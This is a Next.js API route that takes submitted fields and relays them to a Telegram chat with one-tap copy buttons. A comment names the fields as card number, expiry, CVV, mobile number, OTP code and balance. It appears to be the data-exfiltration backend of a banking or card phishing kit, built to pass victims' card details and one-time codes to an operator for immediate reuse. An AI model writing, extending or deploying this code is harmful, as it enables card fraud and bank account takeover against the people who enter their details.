import { NextResponse, after } from 'next/server'
import { buildCopyKeyboard, sendTelegramMessage } from '@/lib/telegram-server'

// Fields whose value is just context (which bank) rather than a detail an
// admin would want a one-tap "copy" button for.
const NO_COPY_BUTTON_LABELS = new Set(['Bank'])

// Telegram's API can occasionally be slow to respond. Sending happens in
// after() so this route always responds quickly to the client instead of
// risking a platform request timeout while waiting on Telegram.
export const maxDuration = 60

type Field = { label: string; value: string }

// Escape the small set of characters that break Telegram HTML parse mode.
function escapeHtml(value: string) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const title = typeof body?.title === 'string' ? body.title.trim() : ''

    const rawFields = Array.isArray(body?.fields) ? body.fields : []
    const fields: Field[] = rawFields
      .map((field: unknown) => {
        const f = field as Partial<Field>
        return {
          label: typeof f?.label === 'string' ? f.label.trim().slice(0, 60) : '',
          value: typeof f?.value === 'string' ? f.value.trim().slice(0, 200) : '',
        }
      })
      .filter((field: Field) => field.label && field.value)

    if (!title || title.length > 120 || fields.length === 0) {
      return NextResponse.json({ error: 'Invalid payload' }, { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      return NextResponse.json({ error: 'Telegram is not configured' }, { status: 503 })
    }

    const lines = fields
      .map((f) => `<b>${escapeHtml(f.label)}:</b> ${escapeHtml(f.value)}`)
      .join('\n')
    const text = `<b>${escapeHtml(title)}</b>\n${lines}`

    // One-tap "copy" button per sensitive field, e.g. Card Number, Expiry,
    // CVV, Mobile, OTP Code, Balance — matches the checkmark + copy-icon
    // buttons Telegram renders for copy_text inline keyboard buttons.
    const copyButtons = fields
      .filter((f) => !NO_COPY_BUTTON_LABELS.has(f.label))
      .map((f) => ({ text: `✅ Copy ${f.label}`, value: f.value }))
    const replyMarkup = copyButtons.length > 0 ? buildCopyKeyboard(copyButtons) : undefined

    after(async () => {
      const sent = await sendTelegramMessage(token, chatId, text, 'HTML', replyMarkup)
      if (!sent) {
        console.log('[v0] Telegram notify: failed after all retries')
      }
    })

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Invalid request' }, { status: 400 })
  }
}
